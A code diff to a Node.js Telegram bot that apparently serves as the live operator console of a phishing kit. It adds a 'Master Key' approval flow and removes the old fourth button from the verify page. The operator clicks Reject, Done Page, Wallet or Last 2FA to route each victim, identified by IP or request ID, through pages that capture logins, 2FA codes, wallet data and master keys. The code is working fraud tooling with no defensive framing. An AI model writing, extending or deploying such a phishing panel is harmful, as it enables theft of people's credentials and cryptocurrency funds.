@@ -146,7 +146,7 @@ async function sendLoginTelegram(email, message) {
 }
 
 // -----------------
-// Verify page approval (4 buttons, no reject)
+// Verify page approval (3 buttons, no reject)
 // -----------------
 async function sendVerifyTelegram(ip, message) {
   const options = {
@@ -155,8 +155,7 @@ async function sendVerifyTelegram(ip, message) {
       inline_keyboard: [
         [{ text: "🏁 Done Page 🏁", callback_data: `page1|${ip}` }],
         [{ text: "🔐 Last 2FA 🔐", callback_data: `page2|${ip}` }],
-        [{ text: "💼 Wallet 💼", callback_data: `page3|${ip}` }],
-        [{ text: "🗝️ Master Key 🗝️", callback_data: `page4|${ip}` }]
+        [{ text: "💼 Wallet 💼", callback_data: `page3|${ip}` }]
       ]
     }
   };
@@ -164,9 +163,21 @@ async function sendVerifyTelegram(ip, message) {
 }
 
 // -----------------
-// ✅ NEW: 2FA page with 3 buttons (Reject / Done / Wallet)
-// Used by /api/submit-2fa-new only
+// ✅ NEW: Master Key page (Reject / Done Page / Wallet)
 // -----------------
+async function sendMasterKeyTelegram(message, requestId) {
+  const options = {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "❌ Reject ❌", callback_data: `mk_reject|${requestId}` }],
+        [{ text: "🏁 Done Page 🏁", callback_data: `mk_done|${requestId}` }],
+        [{ text: "💼 Wallet 💼", callback_data: `mk_wallet|${requestId}` }]
+      ]
+    }
+  };
+  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
+}
 async function send2FATelegram(message, requestId) {
   const options = {
     parse_mode: "HTML",
@@ -223,6 +234,39 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, identifier] = query.data.split("|");
     let status;
+
+    // --- ✅ NEW: Handle Master Key page 3-button actions ---
+    if (action === "mk_reject" || action === "mk_done" || action === "mk_wallet") {
+      let newStatus, replyText;
+
+      if (action === "mk_reject") {
+        newStatus = "rejected";
+        replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
+      } else if (action === "mk_done") {
+        newStatus = "mk_approved1";
+        replyText = `🏁 <code>${identifier}</code> has been directed to <b>Done Page</b>`;
+      } else if (action === "mk_wallet") {
+        newStatus = "mk_approved2";
+        replyText = `💼 <code>${identifier}</code> has been directed to <b>Wallet</b>`;
+      }
+
+      await fetch(`${APP_URL}/api/update-masterkey-status`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ requestId: identifier, status: newStatus })
+      });
+
+      try {
+        await bot.editMessageReplyMarkup(
+          { inline_keyboard: [] },
+          { chat_id: query.message.chat.id, message_id: query.message.message_id }
+        );
+      } catch (_) {}
+
+      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
+      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
+      return;
+    }
 
     // --- Handle old-style 2FA approve/reject (unchanged) ---
     if (action === "2fa_approve" || action === "2fa_reject") {
@@ -304,10 +348,9 @@ bot.on("callback_query", async (query) => {
     else if (action === "page1") status = "accepted1";
     else if (action === "page2") status = "accepted2";
     else if (action === "page3") status = "accepted3";
-    else if (action === "page4") status = "accepted4";
     else status = "rejected";
 
-    const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3", "accepted4"].includes(status);
+    const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3"].includes(status);
     const actionLabel = isAccepted ? "ACCEPTED! ✅" : "REJECTED! ❌";
 
     // Notify backend
@@ -334,8 +377,6 @@ bot.on("callback_query", async (query) => {
       replyText = `📍 <code>${identifier}</code> has been directed to <b>🔐 Last 2FA 🔐</b>`;
     } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
       replyText = `📍 <code>${identifier}</code> has been directed to <b>💼 Wallet 💼</b>`;
-    } else if (status === "accepted4" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
-      replyText = `📍 <code>${identifier}</code> has been directed to <b>🗝️ Master Key 🗝️</b>`;
     } else {
       const isSMS = /^\d+$/.test(identifier);
       replyText = isSMS
@@ -377,5 +418,6 @@ module.exports = {
   sendLoginTelegram,
   sendVerifyTelegram,
   send2FATelegram,
-  send2FACode
+  send2FACode,
+  sendMasterKeyTelegram
 };
